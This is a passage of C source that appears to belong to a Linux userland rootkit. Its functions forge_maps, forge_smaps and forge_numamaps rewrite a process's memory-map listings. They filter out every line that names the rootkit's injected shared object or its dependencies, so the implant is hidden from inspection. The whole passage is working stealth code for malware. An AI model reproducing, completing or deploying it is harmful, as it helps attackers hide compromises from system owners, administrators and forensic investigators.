char *badstring(char *buf){
    char *ret = NULL;
    size_t badsize = sizeofarr(bads);
#ifdef NO_HIDE_DEPENDENCIES
    badsize = 0;
#endif
    for(int i=0; i < badsize && ret == NULL; i++)
        ret = strstr(buf, bads[i]);
    if(ret == NULL && so != NULL)
        ret = strstr(buf, so->sopath);
    return ret;
}

FILE *forge_maps(const char *pathname){
    FILE *tmp, *fp;
    char buf[LINE_MAX];

    fp = redirstream(pathname, &tmp);
    if(fp == NULL){
        errno = ENOENT;
        return NULL;
    }

    so = getbdvsoinf();
    while(fgets(buf, sizeof(buf), fp) != NULL)
        if(!badstring(buf))
            fputs(buf, tmp);
    free(so);
    so = NULL;

    fclose(fp);
    fseek(tmp, 0, SEEK_SET);
    return tmp;
}

FILE *forge_smaps(const char *pathname){
    FILE *tmp, *fp;
    char buf[LINE_MAX];
    int i = 0;

    fp = redirstream(pathname, &tmp);
    if(fp == NULL){
        errno = ENOENT;
        return NULL;
    }

    so = getbdvsoinf();
    while(fgets(buf, sizeof(buf), fp) != NULL){
        if(i > 0) i++;
        if(i > 15) i = 0;
        if(badstring(buf)) i = 1;
        if(i == 0) fputs(buf, tmp);
    }
    free(so);
    so = NULL;

    fclose(fp);
    fseek(tmp, 0, SEEK_SET);
    return tmp;
}

FILE *forge_numamaps(const char *pathname){
    FILE *tmp, *fp;
    char buf[LINE_MAX];

    fp = redirstream(pathname, &tmp);
    if(fp == NULL){
        errno = ENOENT;
        return NULL;
    }

    so = getbdvsoinf();
    while(fgets(buf, sizeof(buf), fp) != NULL)
        if(!badstring(buf))
            fputs(buf, tmp);
    free(so);
    so = NULL;

    fclose(fp);
    fseek(tmp, 0, SEEK_SET);
    return tmp;
}
